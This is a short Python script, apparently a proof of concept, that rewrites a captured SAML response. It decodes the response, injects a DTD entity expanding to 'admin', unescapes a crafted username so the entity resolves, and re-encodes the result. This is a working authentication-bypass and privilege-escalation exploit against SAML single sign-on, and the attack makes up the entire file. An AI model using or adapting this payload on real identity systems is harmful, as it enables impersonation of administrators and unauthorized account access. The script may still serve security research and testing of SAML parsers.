# This takes the SAMLResponse url parameter and modifies it 
# unescaping the entity and adding a DTD.

from base64 import b64decode, b64encode
import zlib
import urllib.parse
import gzip
import sys

samlResponse = sys.argv[1]
# This assumes the username used is ak&:123;
entityName = b":123"

decoded = b'<!DOCTYPE saml [<!ENTITY ' + entityName + b' "admin">]>' + zlib.decompress( b64decode( urllib.parse.unquote( samlResponse ) ), -15 ).replace( b'&amp;' + entityName + b';', b'&' + entityName + b';' )
print(urllib.parse.quote(b64encode(zlib.compress(decoded, wbits=-15))))
